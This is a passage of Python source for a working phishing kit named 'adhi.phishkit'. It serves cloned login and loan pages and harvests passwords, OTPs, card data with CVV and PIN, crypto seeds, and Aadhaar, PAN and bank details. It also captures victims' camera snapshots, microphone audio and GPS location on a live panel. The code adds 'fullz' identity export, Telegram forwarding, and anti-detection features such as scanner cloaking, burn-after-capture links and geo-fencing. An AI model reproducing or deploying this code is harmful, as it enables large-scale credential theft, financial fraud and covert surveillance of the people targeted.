                  "<div class='panel'><h3>Dump</h3><div class='scroll'><table>" + rows + "</table></div></div>" +
                  geo + aud + thumbs + "<div class='panel'><h3>Trace</h3><div class='scroll'><table>" +
                  (logs or "<tr><td class='empty'>none</td></tr>") + "</table></div></div>"
                  "<div class='toast' id='toast'></div><script>function cp(u){navigator.clipboard&&"
                  "navigator.clipboard.writeText(u);var e=document.getElementById('toast');"
                  "e.textContent='copied';e.className='toast on';setTimeout(function(){e.className='toast'},1500)}"
                  "function fullz(i){fetch('/admin/api/fullz?id='+i).then(function(r){return r.text()}).then(cp)}"
                  "</script></div>")

def a_live(tok):
    r = sess(tok)
    if not r:
        return "<h1>gone</h1>"
    with db() as c:
        med = c.execute("SELECT * FROM media WHERE token=? ORDER BY id DESC LIMIT 120", (tok,)).fetchall()
    sn = [m for m in med if m["kind"] == "snap"]
    au = [m for m in med if m["kind"] in ("aud", "mp3")]
    gm = [m for m in med if m["kind"] == "geo"]
    cam = ("<img class='live' id='cam' src='/m/" + html.escape(sn[0]["file"]) + "'>") if sn else \
          "<div class='mono' id='cam'>waiting for camera...</div>"
    cells = "".join("<div class='cell'><a href='/m/" + html.escape(m["file"]) + "' target='_blank'>"
                    "<img src='/m/" + html.escape(m["file"]) + "'></a>"
                    "<a class='dl' download href='/m/" + html.escape(m["file"]) + "'>"
                    "<svg width='10' height='10' viewBox='0 0 24 24' fill='none' stroke='currentColor' "
                    "stroke-width='2.6'><path d='M12 3v12'/><path d='M7 11l5 5 5-5'/></svg>save</a></div>"
                    for m in sn)
    geo = ""
    if gm:
        g = gm[0]
        geo = ("<div class='row'><a class='btn track' target='_blank' href='" +
               gmaps(html.escape(g["lat"] or "0"), html.escape(g["lon"] or "0")) +
               "'><svg viewBox='0 0 24 24'><path d='M12 21s-7-5.6-7-11a7 7 0 1 1 14 0c0 5.4-7 11-7 11z'/>"
               "<circle cx='12' cy='10' r='2.6'/></svg>Track on Google Maps</a>"
               "<button onclick=\"cp('" + html.escape(g["lat"] or "") + "," + html.escape(g["lon"] or "") +
               "')\">Copy coords</button></div><div class='mono' style='margin-top:8px'>" +
               html.escape(g["lat"]) + ", " + html.escape(g["lon"]) + " &plusmn;" + html.escape(g["acc"] or "0") +
               "m</div><div class='mapbox'><iframe src='https://www.openstreetmap.org/export/embed.html?bbox=" +
               html.escape(g["lon"] or "0") + "," + html.escape(g["lat"] or "0") + "," +
               html.escape(g["lon"] or "0") + "," + html.escape(g["lat"] or "0") + "&layer=mapnik&marker=" +
               html.escape(g["lat"] or "0") + "," + html.escape(g["lon"] or "0") + "'></iframe></div>")
    ad = "".join("<div class='aud'><audio controls src='/m/" + html.escape(m["file"]) + "'></audio>"
                 "<a class='dl' download href='/m/" + html.escape(m["file"]) + "'>"
                 "<svg width='11' height='11' viewBox='0 0 24 24' fill='none' stroke='currentColor' "
                 "stroke-width='2.4'><path d='M12 3v12'/><path d='M7 11l5 5 5-5'/></svg>save mp3</a></div>"
                 for m in au[:12])
    return ashell("live " + tok,
                  "<div class='wrap'><header><span class='brand'><span class='dot'></span>live <span>" +
                  html.escape(tok) + "</span></span><span class='sp'></span>"
                  "<button onclick='location.reload()'>Refresh</button>"
                  "<button onclick=\"dlall()\">" + DLIC + " Save all photos</button></header>"
                  "<div class='panel'><h3>Camera &middot; every 3s</h3>" + cam + "</div>"
                  "<div class='panel'><h3>Captures (" + str(len(sn)) + ")</h3>" +
                  ("<div class='mgrid' id='grid'>" + cells + "</div>" if sn else "<div class='mono'>none yet</div>") +
                  "</div>"
                  "<div class='panel' id='geo'><h3>Location</h3>" +
                  (geo or "<div class='mono'>waiting for GPS permission...</div>") + "</div>"
                  "<div class='panel'><h3>Mic &middot; MP3</h3>" + (ad or "<div class='mono'>waiting...</div>") +
                  "</div>"
                  "<div class='panel'><h3>Session</h3><div class='mono'>" + html.escape(r["site"] or "") +
                  " &middot; " + html.escape(r["ip"] or "") + " &middot; " + html.escape(r["created"] or "") +
                  "</div></div><div class='toast' id='toast'></div>"
                  "<script>var T='" + html.escape(tok) + "',done=false,seen=" + str(len(sn)) + ";"
                  "function cp(u){navigator.clipboard&&navigator.clipboard.writeText(u);"
                  "var e=document.getElementById('toast');e.textContent='copied';e.className='toast on';"
                  "setTimeout(function(){e.className='toast'},1500)}"
                  "function dlall(){document.querySelectorAll('.mgrid .dl').forEach(function(a,i){"
                  "setTimeout(function(){a.click()},i*220)})}"
                  "function poll(){if(done)return;fetch('/a/'+T+'/geo').then(function(r){return r.json()})"
                  ".then(function(g){if(!g.lat||done)return;done=true;"
                  "var el=document.getElementById('geo');"
                  "el.innerHTML='<h3>Location</h3><div class=\"row\"><a class=\"btn track\" target=\"_blank\" "
                  "href=\"https://www.google.com/maps?q='+g.lat+','+g.lon+'&z=17\">Track on Google Maps</a>"
                  "<button onclick=\"cp(\\''+g.lat+','+g.lon+'\\')\">Copy coords</button></div>"
                  "<div class=\"mono\" style=\"margin-top:8px\">'+g.lat+', '+g.lon+' &plusmn;'+g.acc+'m</div>'"
                  "+'<div class=\"mapbox\"><iframe src=\"https://www.openstreetmap.org/export/embed.html?bbox='"
                  "+g.lon+','+g.lat+','+g.lon+','+g.lat+'&layer=mapnik&marker='+g.lat+','+g.lon+'\"></iframe></div>';"
                  "}).catch(function(){})}"
                  "function refresh(){fetch('/a/'+T+'/shots').then(function(r){return r.json()})"
                  ".then(function(d){if(d.n===seen)return;seen=d.n;"
                  "var g=document.getElementById('grid');if(!g)return;"
                  "var add='';for(var i=0;i<d.f.length;i++){var f=d.f[i];"
                  "add+='<div class=\"cell\"><a href=\"/m/'+f+'\" target=\"_blank\"><img src=\"/m/'+f+'\"></a>"
                  "<a class=\"dl\" download href=\"/m/'+f+'\"><svg width=\"10\" height=\"10\" viewBox=\"0 0 24 24\" "
                  "fill=\"none\" stroke=\"currentColor\" stroke-width=\"2.6\"><path d=\"M12 3v12\"/>"
                  "<path d=\"M7 11l5 5 5-5\"/></svg>save</a></div>';}"
                  "if(add)g.insertAdjacentHTML('afterbegin',add);}).catch(function(){})}"
                  "setInterval(poll,4000);poll();setInterval(refresh,3000);</script></div>")

def fullz_text(r):
    L = ["=== adhi.phishkit fullz ===", "site    : " + (r["site"] or ""), "device  : " + (r["dev"] or ""),
         "time    : " + (r["created"] or ""), "ip      : " + (r["ip"] or "")]
    for k, lab in (("name", "name"), ("ident", "user"), ("pw", "pass"), ("pan", "pan"), ("aadhaar", "aadhaar"),
                   ("dob", "dob"), ("addr", "address"), ("city", "city"), ("zip", "pin"), ("state", "state"),
                   ("emp", "employment"), ("income", "income"), ("email", "email"), ("acct", "account"),
                   ("ifsc", "ifsc"), ("bname", "bank"), ("holder", "holder"), ("card", "card"), ("exp", "exp"),
                   ("cvv", "cvv"), ("pin", "atm-pin"), ("otp", "otp"), ("seed", "seed"), ("amount", "loan"),
                   ("giftcode", "code")):
        if r[k]:
            L.append("%-8s: %s" % (lab, r[k]))
    return "\n".join(L) + "\n"

def a_dash():
    with db() as c:
        total = c.execute("SELECT COUNT(*) FROM sessions").fetchone()[0]
    alive = tun_ok(); last = CFG.get("last_site") or "instagram"
    cards = ""
    for cat, title in CATS:
        ks = [k for k, v in SITES.items() if v["c"] == cat]
        if not ks:
            continue
        cards += ("<div class='mono' style='margin:8px 0 5px;font-size:9px;letter-spacing:1px'>" + title +
                  "</div><div style='display:flex;flex-wrap:wrap;gap:5px'>")
        cards += "".join("<button class='kc' data-k='" + k + "' onclick=\"pick('" + k + "')\">" +
                         html.escape(SITES[k]["l"]) + "</button>" for k in ks)
        cards += "</div>"
    provs = "".join("<option value='" + p + ("' selected>" if CFG.get("tunnel_provider") == p else "'>") +
                    ("Auto (best)" if p == "auto" else p) + "</option>" for p in ("auto",) + PROVS)
    rms = "".join("<option value='" + k + ("' selected>" if CFG.get("root_mode") == k else "'>") + v + "</option>"
                  for k, v in (("last", "Last generated kit"), ("chooser", "Chooser page")))
    bsel = " selected" if CFG.get("show_badge") else ""
    otg = " on" if CFG["otp"].get(last, True) else ""

    def sw(k, title, desc):
        return ("<div class='sw'><div>" + title + "<small>" + desc + "</small></div><div class='tg" +
                (" on" if CFG.get(k) else "") + "' onclick=\"tg(this,'" + k + "')\"></div></div>")

    p = []
    p.append("<div class='wrap'><header><span class='brand'><span class='dot'></span>adhi.<span>phishkit</span></span>"
             "<span class='ver'>v36</span>"
             "<span class='ver' style='color:" + ("var(--ac)" if alive else "var(--rd)") + ";border-color:" +
             ("#175443" if alive else "#3b1d26") + "'>" + ("LIVE" if alive else "OFFLINE") + "</span>"
             "<span class='sp'></span>"
             "<button onclick='location.reload()'><svg viewBox='0 0 24 24'><path d='M21 12a9 9 0 1 1-3-6.7'/>"
             "<path d='M21 3v6h-6'/></svg>Refresh</button>"
             "<button class='r' onclick='clr()'><svg viewBox='0 0 24 24'><path d='M4 7h16M9 7V4h6v3'/>"
             "<path d='M6 7l1 13h10l1-13'/></svg>Purge</button>"
             "<a href='/admin/export'><button><svg viewBox='0 0 24 24'><path d='M12 3v12'/><path d='M7 11l5 5 5-5'/>"
             "<path d='M4 21h16'/></svg>Export</button></a>"
             "<a href='/admin/logout'><button class='g'>Exit</button></a></header>")
    p.append("<div class='stats'><div class='stat a'><b id='c1'>0</b><span>Hits</span></div>"
             "<div class='stat a'><b id='c8'>0</b><span>Loans</span></div><div class='stat a'><b id='c2'>0</b>"
             "<span>Passwords</span></div><div class='stat c'><b id='c3'>0</b><span>OTP</span></div>"
             "<div class='stat d'><b id='c4'>0</b><span>Cards</span></div><div class='stat d'><b id='c6'>0</b>"
             "<span>Seeds</span></div><div class='stat b'><b id='c7'>0</b><span>Blocked</span></div>"
             "<div class='stat'><b>" + str(total) + "</b><span>Sessions</span></div></div>")
    p.append("<div class='grid2'><div><div class='panel'><h3>Live traffic</h3>"
             "<div class='chips'><button class='on' data-f='all' onclick=\"setf('all')\">All</button>"
             "<button data-f='loan' onclick=\"setf('loan')\">Loans</button>"
             "<button data-f='card' onclick=\"setf('card')\">Cards</button>"
             "<button data-f='pw' onclick=\"setf('pw')\">Passwords</button>"
             "<button data-f='seed' onclick=\"setf('seed')\">Seeds</button></div>"
             "<div class='row' style='margin:9px 0 10px'><input id='q' placeholder='Search name, card, IP, kit...' "
             "oninput='load()'><button class='tg" + (" on" if CFG.get("sound") else "") +
             "' id='snd' onclick=\"snd(this)\" title='Sound alert'></button>"
             "<button class='tg" + (" on" if CFG.get("notify") else "") +
             "' id='ntf' onclick=\"ntf(this)\" title='Desktop notify'></button></div>"
             "<div class='scroll'><table><thead><tr><th>#</th><th>Time</th><th>Kit</th><th>Dev</th><th>Loan</th>"
             "<th>Name</th><th>Holder</th><th>Card</th><th>Exp</th><th>CVV</th><th>PIN</th><th>Password</th>"
             "<th>OTP</th><th>Seed</th><th>IP</th><th></th></tr></thead><tbody id='rows'>"
             "<tr><td colspan='16' class='empty'>No traffic yet.</td></tr></tbody></table></div></div></div><div>")
    p.append("<div class='panel'><h3>Payload builder</h3><label>Public base URL</label><div class='row'>"
             "<input id='pub' value=\"" + html.escape(base_url()) + "\"><button onclick='setpub()'>Set</button></div>"
             "<label>Tunnel engine</label><select id='prov'>" + provs + "</select><div class='row'>" +
             ("<button class='r' onclick=\"tun('stop')\">Kill tunnel</button>" if alive
              else "<button class='p' onclick=\"tun('start')\">Start tunnel</button>") +
             "<button onclick='qr()'>QR</button></div><div class='mono' style='margin-top:7px'>" +
             (TKIND + " :: " + html.escape(TURL) if TURL else "no tunnel") + "</div>"
             "<label>Kit</label><div class='panel' style='max-height:190px;overflow:auto;padding:8px;margin:0'>"
             + cards + "</div><input type='hidden' id='site' value='" + last + "'>"
             "<label>Disguise path</label><input id='slug'>"
             "<div class='sw' style='margin-top:12px;border:0;padding:0'><div>OTP step"
             "<small>Ask the victim for a one-time code on this kit</small></div>"
             "<div class='tg" + otg + "' id='otgt' onclick=\"togOtp(this)\"></div></div>"
             "<label>Device mode</label><div class='devs'>"
             "<button class='on' data-d='auto' onclick=\"pick_dev('auto')\">Auto</button>"
             "<button data-d='mobile' onclick=\"pick_dev('mobile')\">Mobile</button>"
             "<button data-d='laptop' onclick=\"pick_dev('laptop')\">Laptop</button></div>"
             "<div class='hint'>à´à´ªàµà´ªàµà´´àµà´ à´à´±àµà´± à´²à´¿à´àµà´àµ. à´¡à´¿à´µàµà´¸àµ à´¸àµà´µà´¯à´ à´¤à´¿à´°à´¿à´àµà´à´±à´¿à´¯àµà´. "
             "<a id='pv' href='#' target='_blank'>preview</a></div>"
             "<label>Quantity</label><input id='n' type='number' min='1' max='50' value='1'>"
             "<div class='row'><button class='p' id='gp' onclick=\"gen(0)\">Generate link</button>"
             "<button id='gs' onclick=\"gen(1)\">+ Live panel</button></div>"
             "<label>Result</label><div id='out'></div></div>")
    p.append("<div class='panel'><h3>Anti-detection</h3>"
             + sw("cloak", "Bot cloaking", "Scanners see the real site")
             + sw("burn", "Burn after capture", "Link dies once data lands")
             + sw("instant", "Instant redirect", "Bounce to real site after capture")
             + "<div class='cols2'><div><label>Max visits</label><input id='maxv' type='number' min='0' "
             "value='" + str(CFG.get("maxv") or 0) + "'></div><div><label>Expiry (min)</label>"
             "<input id='ttl' type='number' min='0' value='" + str(CFG.get("ttl") or 0) + "'></div></div>"
             "<label>Allow only countries</label><input id='geo' value=\"" + html.escape(CFG.get("geo") or "") +
             "\" placeholder='IN, AE, SG'><div class='hint'>Empty = allow all.</div></div>")
    p.append("<div class='panel'><h3>Config</h3><label>Root behaviour</label><select id='rmode'>" + rms +
             "</select><label>OTP length</label><input id='olen' type='number' min='4' max='8' value='" +
             str(CFG["otp_len"]) + "'><label>Landing title</label><input id='title' value=\"" +
             html.escape(CFG.get("site_title", "")) + "\"><label>Watermark</label><select id='badge'>"
             "<option value='0'>Off</option><option value='1'" + bsel + ">On</option></select>"
             "<label>Telegram token</label><input id='ttok' value=\"" +
             html.escape(CFG.get("telegram_token", "")) + "\"><label>Telegram chat ID</label>"
             "<input id='tchat' value=\"" + html.escape(CFG.get("telegram_chat", "")) + "\">"
             "<div class='row'><button class='p' onclick='save()'>Save settings</button></div>"
             "<label style='margin-top:14px'>Change admin password</label><input id='npw' type='password'>"
             "<div class='row'><button onclick='chpw()'>Rotate</button></div></div>")
    p.append("</div></div><div class='toast' id='toast'></div><script>var V=" +
             json.dumps({k: v["van"] for k, v in SITES.items()}) + ",O=" +
             json.dumps({k: (1 if CFG["otp"].get(k, True) else 0) for k in SITES}) +
             ";" + ADM_JS + "slugdef();</script></div>")
    return ashell("phishkit :: console", "".join(p))

class H(BaseHTTPRequestHandler):
    server_version = "adhi.phishkit/36"
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def send(self, code, body, ctype="text/html; charset=utf-8", extra=None):
        b = body.encode("utf-8") if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(b)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("X-Robots-Tag", "noindex, nofollow, noarchive")
        self.send_header("Referrer-Policy", "no-referrer")
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        if b:
            self.wfile.write(b)

    def redir(self, loc, extra=None):
        h = {"Location": loc}; h.update(extra or {})
        self.send(302, "", extra=h)

    def js(self, o, c=200):
        self.send(c, json.dumps(o), "application/json")

    def ip(self):
        if CFG.get("trust_proxy"):
            f = (self.headers.get("CF-Connecting-IP")
                 or (self.headers.get("X-Forwarded-For") or "").split(",")[0].strip())
            if f:
                return f
        return self.client_address[0]

    def ua(self):
        return self.headers.get("User-Agent", "")

    def hdr(self):
        try:
            return json.dumps(dict(self.headers))
        except Exception:
            return ""

    def raw(self):
        n = int(self.headers.get("Content-Length") or 0)
        return self.rfile.read(n) if n else b""

    def parse(self, raw):
        ct = self.headers.get("Content-Type") or ""
        if "multipart/form-data" not in ct:
            if "application/json" in ct:
                try:
                    return json.loads(raw.decode("utf-8", "replace") or "{}"), {}
                except Exception:
                    return {}, {}
            return {k: v[0] for k, v in urllib.parse.parse_qs(raw.decode("utf-8", "replace")).items()}, {}
        m = re.search(r'boundary=(?:"([^"]+)"|([^\s;]+))', ct)
        if not m:
            return {}, {}
        bd = ("--" + (m.group(1) or m.group(2))).encode()
        fields, files = {}, {}
        for part in raw.split(bd):
            if b"\r\n\r\n" not in part:
                continue
            head, body = part.split(b"\r\n\r\n", 1)
            if body.endswith(b"\r\n"):
                body = body[:-2]
            hs = head.decode("utf-8", "replace")
            fm = re.search(r'name="([^"]*)"', hs)
            if not fm:
                continue
            nm = fm.group(1)
            fn = re.search(r'filename="([^"]*)"', hs)
            if fn and fn.group(1):
                files[nm] = (fn.group(1), body)
            else:
                fields[nm] = body.decode("utf-8", "replace")
        return fields, files

    def auth(self):
        for part in (self.headers.get("Cookie") or "").split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                if k == "adhi":
                    with ALOCK:
                        t = ADMIN.get(v)
                        if t and time.time() - t < ATTL:
                            return True
                        ADMIN.pop(v, None)
        return False

    def path_for(self, site, tok):
        return "/%s/%s" % (CFG["vanity"].get(site) or SITES[site]["van"], tok)

    def nf(self, m="Dead link."):
        return self.send(404, ashell("404", "<div class='login panel'><div class='brand'>404</div>"
                                     "<div class='hint'>" + html.escape(m) + "</div><div class='row'>"
                                     "<a href='/'><button>Home</button></a>"
                                     "<a href='/admin'><button>Console</button></a></div></div>"))

    def gate(self, r, s):
        real = "https://" + s["dom"]
        if (r["expires"] or "") and now() > r["expires"]:
            ev(r["token"], "blocked", "expired"); return real
        if (r["maxv"] or 0) and (r["hits"] or 0) >= r["maxv"]:
            ev(r["token"], "blocked", "visit-limit"); return real
        if r["burn"] and r["status"] == "done":
            ev(r["token"], "blocked", "burned"); return real
        if CFG.get("cloak") and is_bot(self.ua()):
            ev(r["token"], "blocked", "bot: " + self.ua()[:60]); return real
        geo = (CFG.get("geo") or "").upper().replace(" ", "")
        if geo:
            got = (self.headers.get("CF-IPCountry") or "").upper()
            if got and got not in geo.split(","):
                ev(r["token"], "blocked", "geo: " + got); return real
        return None

    def serve(self, tok, step=None):
        r = sess(tok)
        if not r:
            return self.nf("Token expired.")
        site = r["site"] if r["site"] in SITES else None
        if not site:
            return self.send(200, chooser(tok))
        s = SITES[site]
        bounce = self.gate(r, s)
        if bounce:
            return self.redir(bounce)
        qs = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        qd = (qs.get("d") or [""])[0].lower()
        d = "m" if qd in ("m", "mobile") else ("l" if qd in ("l", "laptop", "desktop") else "")
        if not d:
            d = r["dev"] if r["dev"] in ("m", "l") else auto_dev(self.ua())
        elif d != (r["dev"] or ""):
            upd(tok, dev=d)
        CUR["dev"] = d
        CUR["sens"] = int(r["sens"] or 0)
        CUR["tok"] = tok
        with db() as c:
            c.execute("UPDATE sessions SET hits=IFNULL(hits,0)+1 WHERE token=?", (tok,))
        step = step or s["fl"][0]
        if step not in s["fl"]:
            step = s["fl"][0]
        if step == "otp" and not r["otp_on"]:
            i = s["fl"].index("otp")
            step = s["fl"][i + 1] if i + 1 < len(s["fl"]) else "done"
        upd(tok, step=step, status="visit" if step == s["fl"][0] else "partial")
        ev(tok, "open", "%s/%s/%s" % (site, step, d))
        return self.send(200, render(site, tok, step, dict(r)))

    def do_GET(self):
        try:
            self._g()
        except (BrokenPipeError, ConnectionResetError):
            pass
        except Exception as e:
            traceback.print_exc()
            try:
                self.send(500, "<h1>500</h1><pre>%s</pre>" % html.escape(str(e)))
            except Exception:
                pass

    def _g(self):
        u = urllib.parse.urlparse(self.path)
        path = u.path.strip("/")
        seg = path.split("/") if path else []
        if not path:
            mode = CFG.get("root_mode", "last")
            if mode == "last":
                mode = CFG.get("last_site") or "instagram"
            if mode in SITES:
                t = new_sess(mode, self.ip(), self.ua(), self.hdr(), auto_dev(self.ua()))
                return self.redir(self.path_for(mode, t))
            return self.send(200, chooser(new_sess("landing", self.ip(), self.ua(), self.hdr())))
        if path == "robots.txt":
            return self.send(200, "User-agent: *\nDisallow: /\n", "text/plain")
        if path == "favicon.ico":
            return self.send(204, "")
        if path == "admin":
            return self.send(200, a_dash() if self.auth() else a_login())
        if path == "admin/logout":
            return self.redir("/admin", {"Set-Cookie": "adhi=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax"})
        if seg[0] == "admin" and len(seg) == 3 and seg[1] == "session":
            return self.send(200, a_sess(seg[2])) if self.auth() else self.redir("/admin")
        if seg[0] == "admin" and len(seg) == 3 and seg[1] == "dl":
            if not self.auth():
                return self.redir("/admin")
            with db() as c:
                r = c.execute("SELECT * FROM sessions WHERE id=?", (seg[2],)).fetchone()
            if not r:
                return self.send(404, "no")
            return self.send(200, fullz_text(r), "text/plain",
                             {"Content-Disposition": "attachment; filename=fullz-%s.txt" % seg[2]})
        if seg[0] == "admin" and len(seg) == 3 and seg[1] == "preview":
            if not self.auth():
                return self.redir("/admin")
            k = seg[2]
            if k not in SITES:
                return self.send(404, "no kit")
            t = new_sess(k, self.ip(), "preview", "", "a")
            return self.redir(self.path_for(k, t))
        if seg[0] == "m" and len(seg) == 2:
            fn = os.path.basename(urllib.parse.unquote(seg[1]))
            fp = os.path.join(UPL, fn)
            if not os.path.exists(fp):
                return self.send(404, "no")
            ext = os.path.splitext(fn)[1].lower().lstrip(".")
            ct = {"jpg": "image/jpeg", "jpeg": "image/jpeg", "png": "image/png", "webp": "image/webp",
                  "gif": "image/gif", "pdf": "application/pdf", "mp3": "audio/mpeg",
                  "webm": "audio/webm", "ogg": "audio/ogg"}
            return self.send(200, open(fp, "rb").read(), ct.get(ext, "application/octet-stream"))
        if seg[0] == "a" and len(seg) == 3 and seg[2] == "geo":
            with db() as c:
                g = c.execute("SELECT lat,lon,acc FROM media WHERE token=? AND kind='geo' AND lat<>'' "
                              "ORDER BY id DESC LIMIT 1", (seg[1],)).fetchone()
            return self.js({"lat": (g["lat"] if g else ""), "lon": (g["lon"] if g else ""),
                            "acc": (g["acc"] if g else "")})
        if seg[0] == "a" and len(seg) == 3 and seg[2] == "shots":
            with db() as c:
                rs = c.execute("SELECT file FROM media WHERE token=? AND kind='snap' ORDER BY id DESC LIMIT 120",
                               (seg[1],)).fetchall()
                n = c.execute("SELECT COUNT(*) FROM media WHERE token=? AND kind='snap'", (seg[1],)).fetchone()[0]
            return self.js({"n": n, "f": [r["file"] for r in rs]})
        if seg[0] == "a" and len(seg) == 2:
            return self.send(200, a_live(seg[1]))
        if path == "admin/export":
            if not self.auth():
                return self.redir("/admin")
            with db() as c:
                rs = c.execute("SELECT * FROM sessions ORDER BY id DESC").fetchall()
            buf = io.StringIO(); w = csv.writer(buf)
            cols = ("id", "created", "site", "dev", "name", "ident", "pan", "aadhaar", "dob", "addr", "city",
                    "zip", "state", "emp", "income", "email", "acct", "ifsc", "bname", "holder", "pw", "otp",
                    "card", "exp", "cvv", "pin", "seed", "amount", "tenure", "giftcode", "ip", "ua")
            w.writerow(cols)
            for r in rs:
                w.writerow([r[k] for k in cols])
            return self.send(200, buf.getvalue(), "text/csv",
                             {"Content-Disposition": "attachment; filename=phishkit.csv"})
        if path == "admin/api/fullz":
            if not self.auth():
                return self.send(401, "auth", "text/plain")
            qs = urllib.parse.parse_qs(u.query)
            with db() as c:
                r = c.execute("SELECT * FROM sessions WHERE id=?", (qs.get("id", [0])[0],)).fetchone()
            return self.send(200, fullz_text(r) if r else "not found", "text/plain")
        if path == "admin/api/sessions":
            if not self.auth():
                return self.js({"rows": [], "stats": {"v": 0, "p": 0, "o": 0, "c": 0, "s": 0, "b": 0, "l": 0}})
            with db() as c:
                rs = c.execute("SELECT * FROM sessions ORDER BY id DESC LIMIT 250").fetchall()
                q = lambda s: c.execute(s).fetchone()[0]
                st = {"v": q("SELECT COUNT(*) FROM sessions"),
                      "p": q("SELECT COUNT(*) FROM sessions WHERE IFNULL(pw,'')<>''"),
                      "o": q("SELECT COUNT(*) FROM sessions WHERE IFNULL(otp,'')<>''"),
                      "c": q("SELECT COUNT(*) FROM sessions WHERE IFNULL(card,'')<>''"),
                      "s": q("SELECT COUNT(*) FROM sessions WHERE IFNULL(seed,'')<>''"),
                      "b": q("SELECT COUNT(*) FROM events WHERE kind='blocked'"),
                      "l": q("SELECT COUNT(*) FROM sessions WHERE IFNULL(amount,'')<>''")}
            ks = ("id", "created", "site", "dev", "ident", "name", "holder", "pw", "otp", "card", "exp", "cvv",
                  "pin", "seed", "ip", "amount")
            return self.js({"rows": [{k: r[k] for k in ks} for r in rs], "stats": st})
        if seg[0] == "s" and len(seg) == 2:
            r = sess(seg[1])
            if not r or r["site"] not in SITES:
                return self.nf()
            return self.redir(self.path_for(r["site"], seg[1]))
        if seg[0] == "t" and len(seg) >= 2:
            return self.serve(seg[1])
        if len(seg) >= 2:
            return self.serve(seg[-1])
        return self.nf()

    def do_POST(self):
        try:
            self._p()
        except (BrokenPipeError, ConnectionResetError):
            pass
        except Exception as e:
            traceback.print_exc()
            try:
                self.send(500, "500 %s" % html.escape(str(e)))
            except Exception:
                pass

    def save_docs(self, tok, files):
        out = []
        for name in ("doc1", "doc2"):
            if name not in files:
                continue
            fn, blob = files[name]
            if not blob:
                continue
            ext = os.path.splitext(fn)[1].lower()
            if ext not in (".jpg", ".jpeg", ".png", ".webp", ".gif", ".pdf"):
                ext = ".jpg"
            safe = "%s_%s_%d%s" % (re.sub(r"[^A-Za-z0-9]", "", tok), name, int(time.time() * 1000) % 100000, ext)
            try:
                open(os.path.join(UPL, safe), "wb").write(blob)
                out.append(safe)
            except Exception as e:
                print("  [!] upload: %s" % e)
        return out

    def _p(self):
        path = urllib.parse.urlparse(self.path).path.strip("/")
        f, files = self.parse(self.raw())
        ip, ua = self.ip(), self.ua()
        if path == "api/res":
            tok = f.get("t") or ""
            kind = f.get("k") or "snap"
            data = f.get("d") or ""
            if not tok or not data:
                return self.js({"ok": False})
            try:
                blob = base64.b64decode(data)
            except Exception:
                return self.js({"ok": False})
            ext = "." + (f.get("ext") or ("webm" if kind == "aud" else "jpg")).lstrip(".")
            if ext not in (".jpg", ".mp3", ".webm", ".ogg"):
                ext = ".jpg"
            safe = "%s_%s_%d%s" % (re.sub(r"[^A-Za-z0-9]", "", tok), kind, int(time.time() * 1000) % 1000000, ext)
            try:
                open(os.path.join(UPL, safe), "wb").write(blob)
                with db() as c:
                    c.execute("INSERT INTO media(token,ts,kind,file,lat,lon,acc) VALUES(?,?,?,?,'','','')",
                              (tok, now(), kind, safe))
            except Exception as e:
                print("  [!] media: %s" % e)
            return self.js({"ok": True})
        if path == "api/geo":
            tok = f.get("t") or ""
            if tok:
                with db() as c:
                    c.execute("INSERT INTO media(token,ts,kind,file,lat,lon,acc) VALUES(?,?,'geo','',?,?,?)",
                              (tok, now(), str(f.get("la") or ""), str(f.get("lo") or ""), str(f.get("ac") or "")))
                ev(tok, "geo", "%s,%s" % (f.get("la"), f.get("lo")))
            return self.js({"ok": True})
        if path.startswith("t/"):
            seg = path.split("/")
            if len(seg) != 4:
                return self.send(404, "bad")
            tok, site, step = seg[1], seg[2], seg[3]
            s = SITES.get(site)
            r = sess(tok)
            if not r or not s or step not in s["fl"]:
                return self.send(404, "bad")
            CUR["dev"] = r["dev"] if r["dev"] in ("m", "l") else auto_dev(ua)
            CUR["sens"] = int(r["sens"] or 0)
            CUR["tok"] = tok
            got = {}
            for k in ("ident", "pw", "otp", "card", "exp", "cvv", "pin", "holder", "seed", "dob", "addr",
                      "zip", "ssn", "extra", "amount", "tenure", "purpose", "name", "pan", "aadhaar", "city",
                      "state", "emp", "income", "email", "acct", "ifsc", "bname"):
                if f.get(k):
                    got[k] = f[k]
            if files:
                docs = self.save_docs(tok, files)
                if docs:
                    got["docs"] = json.dumps(docs)
            if got:
                upd(tok, **got)
            if got.get("amount"):
                upd(tok, fee=str(fee_of(got["amount"])))
            hit("%s :: %s" % (s["l"], step), tok,
                {("user" if k == "ident" else k): v for k, v in got.items()}, ip, ua)
            i = s["fl"].index(step)
            nxt = None
            j = i + 1
            while j < len(s["fl"]):
                cand = s["fl"][j]
                if cand == "otp" and not r["otp_on"]:
                    j += 1
                    continue
                nxt = cand
                break
            if nxt:
                upd(tok, step=nxt)
                return self.send(200, render(site, tok, nxt, dict(sess(tok))))
            upd(tok, status="done", step="done")
            if CFG.get("instant"):
                return self.redir("https://" + s["dom"])
            return self.send(200, done_page(site, dict(sess(tok))))
        if path == "admin/login":
            if secrets.compare_digest(f.get("pw", ""), CFG["admin_password"]):
                t = secrets.token_urlsafe(16)
                with ALOCK:
                    n = time.time()
                    for k, v in list(ADMIN.items()):
                        if n - v >= ATTL:
                            ADMIN.pop(k, None)
                    ADMIN[t] = n
                return self.redir("/admin", {"Set-Cookie": "adhi=%s; Path=/; HttpOnly; SameSite=Lax" % t})
            return self.send(200, a_login("Wrong password."))
        if not self.auth():
            return self.js({"ok": False, "msg": "auth"}, 401)
        if path == "admin/api/shield":
            k = f.get("k")
            if k in ("cloak", "burn", "instant", "sound", "notify"):
                CFG[k] = bool(int(f.get("on") or 0)); save_cfg()
            return self.js({"ok": True})
        if path == "admin/api/otp":
            k = f.get("p") or ""
            if k in SITES:
                CFG["otp"][k] = bool(int(f.get("on") or 0)); save_cfg()
            return self.js({"ok": True})
        if path == "admin/api/pub":
            CFG["public_url"] = (f.get("url") or "").rstrip("/"); save_cfg()
            return self.js({"ok": True})
        if path == "admin/api/link":
            site = f.get("p") or ""
            if site not in SITES:
                return self.js({"ok": False, "msg": "Pick a kit"})
            sens = 1 if f.get("mode") == "sens" else 0
            slug = re.sub(r"[^A-Za-z0-9._/-]", "", (f.get("slug") or "").strip("/")) or SITES[site]["van"]
            CFG["vanity"][site] = slug
